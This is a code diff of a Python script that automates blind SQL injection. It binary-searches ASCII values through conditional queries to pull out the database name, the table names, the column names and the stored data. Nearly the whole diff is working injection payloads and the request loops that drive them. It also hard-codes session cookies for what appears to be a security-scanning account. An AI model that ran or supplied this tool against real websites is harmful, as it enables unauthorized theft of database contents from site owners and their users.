@@ -21,7 +21,7 @@ class SchemaName():  # 爆数据库名
 
     def length_schema(self):  # 猜解数据库名的长度
         for i in range(1,99):
-            payload = "' and if(length(database())={0},1,0) %23"
+            payload = "' and if(length(database()) = {0},1,0) %23"
             url = self.url + payload
             res = requests.get(url = url.format(i), cookies=self.cookie, verify=False)
             if self.true_str in res.text:
@@ -32,7 +32,7 @@ class SchemaName():  # 爆数据库名
 
     def schema_name(self,length):
         database_name = ''
-        payload = "' and if(ascii(substr(database(),{0},1))>{1},1,0) %23"
+        payload = "' and if(ascii(substr(database(),{0},1)) > {1},1,0) %23"
         url = self.url + payload
         for a in range(1, length + 1):
             left = 0
@@ -68,7 +68,7 @@ class TableName():  # 爆表名
 
 
     def table_number(self):
-        payload = "' and if((select count(*) from information_schema.tables where table_schema = '{0}')={1}, 1, 0) %23"
+        payload = "' and if((select count(*) from information_schema.tables where table_schema = '{0}') = {1}, 1, 0) %23"
         url = self.url + payload
         for DBTableCount in range(1, 99):
             res = requests.get(url.format(self.schema_name, DBTableCount))
@@ -83,9 +83,9 @@ class TableName():  # 爆表名
         #获取表长度
         tablelens = 0
         for tablelen in range(1,99):
-            payload = "' and if((select LENGTH(table_name) from information_schema.tables where table_schema = '" + self.schema_name + "' limit {0}, 1)={1}, 1, 0) %23"
+            payload = "' and if((select LENGTH(table_name) from information_schema.tables where table_schema = '{0}' limit {1}, 1) = {2}, 1, 0) %23"
             url = self.url + payload
-            res = requests.get(url.format(x, tablelen))
+            res = requests.get(url.format(self.schema_name,x, tablelen))
             if self.true_str in res.content.decode("utf-8"):
                 print("\033[0;32m%s\033[0m" % "[-]tableLen",x,":",tablelen)
                 tablelens = tablelen
@@ -93,13 +93,13 @@ class TableName():  # 爆表名
 
         tablename = ''
         for y in range(1, tablelens+1):
-            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema='" + self.schema_name + "' limit {0},1),{1},1))>{2},1,0) %23"
+            payload = "' and if(ascii(substr((select table_name from information_schema.tables where table_schema= '{0}' limit {1},1),{2},1)) > {3},1,0) %23"
             url = self.url + payload
             left = 0
             right = 127
             mid = int((left + right) / 2)
             while (left < right):
-                res = requests.get(url=url.format(x, y, mid), cookies=self.cookie, verify=False)  # 改请求方式
+                res = requests.get(url=url.format(self.schema_name, x, y, mid), cookies=self.cookie, verify=False)  # 改请求方式
                 if self.true_str in res.text:
                     left = mid + 1
                 else:
@@ -139,9 +139,9 @@ class ColumnName():
     def column_number(self):
 
         for DBColumnCount in range(1, 99):
-            payload = "' and if((select count(*) from information_schema.columns where table_schema = '" + self.schema_name + "' and table_name ='{0}')={1}, 1, 0) %23"
+            payload = "' and if((select count(*) from information_schema.columns where table_schema = '{0}' and table_name = '{1}') = {2}, 1, 0) %23"
             url = self.url + payload
-            res = requests.get(url.format(self.table_name,DBColumnCount))
+            res = requests.get(url.format(self.schema_name, self.table_name, DBColumnCount))
             if self.true_str in res.content.decode("utf-8"):
                 print("[+]{0}数据表的字段数为:{1}".format(self.table_name,DBColumnCount))
                 self.co_numbers = DBColumnCount
@@ -153,9 +153,9 @@ class ColumnName():
         columnlens = 0
         for columnlen in range(1,99):
             # 获取字段长度
-            payload = "' and if((select length(column_name) from information_schema.columns where table_schema = '" + self.schema_name + "' and table_name ='{0}' limit {1}, 1)={2}, 1, 0) %23"
+            payload = "' and if((select length(column_name) from information_schema.columns where table_schema = '{0}' and table_name = '{1}' limit {2}, 1) = {3}, 1, 0) %23"
             url = self.url + payload
-            res = requests.get(url.format(self.table_name, x, columnlen))
+            res = requests.get(url.format(self.schema_name, self.table_name, x, columnlen))
             if self.true_str in res.content.decode("utf-8"):
                 print("\033[0;32m%s\033[0m" % "[+]columnlen",x,":",columnlen)
                 columnlens = columnlen
@@ -163,13 +163,13 @@ class ColumnName():
 
         columnname = ''
         for y in range(1, columnlens+1):
-            payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema ='" + self.schema_name + "' and table_name = '"+ self.table_name +"' limit {0}, 1), {1}, 1))>{2}, 1, 0) %23"
+            payload = "' and if(ascii(substr((select column_name from information_schema.columns where table_schema = '{0}' and table_name = '{1}' limit {2}, 1), {3}, 1)) > {4}, 1, 0) %23"
             url = self.url + payload
             left = 0
             right = 127
             mid = int((left + right) / 2)
             while (left < right):
-                res = requests.get(url=url.format(x, y, mid), cookies=self.cookie, verify=False)  # 改请求方式
+                res = requests.get(url=url.format(self.schema_name, self.table_name, x, y, mid), cookies=self.cookie, verify=False)  # 改请求方式
                 if self.true_str in res.text:
                     left = mid + 1
                 else:
@@ -224,7 +224,7 @@ class DateValue():
         #获取字段长度
         datalens = 0
         for datalen in range(1,99):
-            payload = "'and if ((select length({0}) from {1} limit {2},1)={3},1,0) %23"
+            payload = "'and if ((select length({0}) from {1} limit {2},1) = {3},1,0) %23"
             url = self.url + payload
             res = requests.get(url.format(self.column_name,self.table_name, x, datalen), cookies=self.cookie, verify=False)
             if self.true_str in res.content.decode("utf-8"):
@@ -234,7 +234,7 @@ class DateValue():
 
         datavalue = ''
         for y in range(1, datalens+1):
-            payload = "'and if (ascii(substr((select {0} from {1} limit {2},1),{3},1))>{4},1,0) %23"
+            payload = "'and if (ascii(substr((select {0} from {1} limit {2},1),{3},1)) > {4},1,0) %23"
             url = self.url + payload
             left = 0
             right = 127
@@ -298,10 +298,9 @@ if __name__ == '__main__':
     cookie = {'EAD_JSESSIONID': '1216591E8D9C5094F2881B640DC2DD4A', 'account': 'anquan_saomiao', 'status': '1',
               '_security': 'b6180d3a2e298f5a6082d55035f2d43a'}
 
+    #eg: python sql_injection.py -u "http://127.0.0.1/?id=1" -f "Hello"
     parser = optparse.OptionParser('usage: python %prog -u url \n\n' 'Example: python %prog -u http://127.0.0.1?id=1\n')
     parser.add_option('-u', '--url', dest= 'targetURL',default='http://127.0.0.1?id=1', type='string',help='Enter SQL injection URL')
     parser.add_option('-f', '--flags', dest= 'targetflag', default='Happy', type='string',help='Enter Flag')
     (options, args) = parser.parse_args()
     StartSqli(options.targetURL,options.targetflag,cookie)
-
-
